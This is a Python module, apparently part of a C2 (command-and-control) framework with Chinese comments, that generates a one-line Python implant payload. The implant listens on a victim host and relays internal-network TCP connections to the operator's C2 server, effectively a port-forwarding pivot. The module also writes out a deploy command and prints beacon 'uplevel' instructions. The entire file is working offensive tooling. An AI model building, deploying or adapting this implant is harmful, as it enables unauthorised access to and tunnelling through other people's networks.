"""
@module: agent_tcp
@desc: 生成 Agent_tcp 一句话 python 载荷: 植入物 TCP 直连(明文, 无 TLS 封装),
解包即原始 TCP 流量(端口转发语义), 帧中继到 server。功能类似端口转发:
把目标内网连接经 agent_tcp 隧道转发到 C2 server(server 侧视作 agent 通道)。
@params: host port [server_key_hex] [out_dir] [agent_id]
"""
import json
import os
import secrets

from server.core.bootstrap import deploy_command
from server.transports.agent_base import relay_code

MODULE = {
    "desc": "生成 Agent_tcp 一句话 python 载荷(TCP 直连中继, 端口转发语义)",
    "params": [
        ("host", "必填，server 地址"),
        ("port", "必填，server implant 端口"),
        ("server_key_hex", "可选；缺省从 server/config.json 读取 implant_key"),
        ("out_dir", "默认 s_modules/output"),
        ("agent_id", "可选；中继标识，转发 register 时 via=agent_tcp:<id>"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

# 纯 TCP 版监听: 无 TLS 包装(agent_tls 的 TL() 去掉), accept 后直接 fwd
_LISTEN_CODE = '''\
def fwd(c):
 u=None
 try:
  u=a.socket();u.settimeout(30);u.connect((_SH,_SP))
  u.sendall(l.token_bytes(256))
  f.Thread(target=a2s,args=(c,u),daemon=True).start()
  s2a(c,u)
 except:pass
 finally:
  try:c.close()
  except:pass
  try:u.close()
  except:pass
def run():
 s=a.socket();s.setsockopt(a.SOL_SOCKET,a.SO_REUSEADDR,1)
 try:s.bind(("0.0.0.0",_LP))
 except Exception as e:print("agent bind failed:",e);return
 s.listen(64)
 while 1:
  try:
   c,_=s.accept()
   f.Thread(target=fwd,args=(c,),daemon=True).start()
  except:pass
run()
'''


def _read_server_key() -> bytes:
    """从 server/config.json 读取 implant_key（agent↔server 用）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
    """生成 Agent_tcp 代码与部署命令。"""
    port = int(port)
    server_key = None
    if server_key_hex:
        server_key = bytes.fromhex(server_key_hex)
    else:
        server_key = _read_server_key()
        if server_key is None:
            return {"status": "error",
                    "message": "config.json 无有效 implant_key。"
                               "请先 s_exec keygen。"}

    agent_key = secrets.token_bytes(32)
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    listen_port = _pick_listen_port()
    via = f"agent_tcp:{agent_id}" if agent_id else "agent_tcp"
    code = relay_code(str(list(server_key)).replace(" ", ""),
                      str(list(agent_key)).replace(" ", ""),
                      host, port, via, long_lived=True)
    code += _LISTEN_CODE.replace("_LP", str(listen_port))
    compile(code, "<agent_tcp>", "exec")  # 生成即校验

    command = deploy_command(code)
    files = {
        "xor_key": os.path.join(out_dir, "agent_tcp_key.hex"),
        "command": os.path.join(out_dir, "agent_tcp_command.txt"),
    }
    with open(files["xor_key"], "w", encoding="utf-8") as f:
        f.write(agent_key.hex() + "\n")
    with open(files["command"], "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "agent_key": agent_key.hex(),
        "listen_port": listen_port,
        "deploy": command,
        "code": code,
        "files": files,
        "uplevel_hint": (
            f"载荷升级: s_exec transport_tcp {host} {listen_port} "
            f"{agent_key.hex()}\n"
            f"然后: uplevel_tcp <beacon_id> {host} {listen_port} "
            f"{agent_key.hex()}"
        ),
    }


def _pick_listen_port() -> int:
    """临时端口探测（listen 端口与 server 端口错开）。"""
    s = __import__("socket").socket()
    s.bind(("0.0.0.0", 0))
    port = s.getsockname()[1]
    s.close()
    return port


if __name__ == "__main__":
    print("usage: s_exec agent_tcp <host> <port> [server_key_hex]")
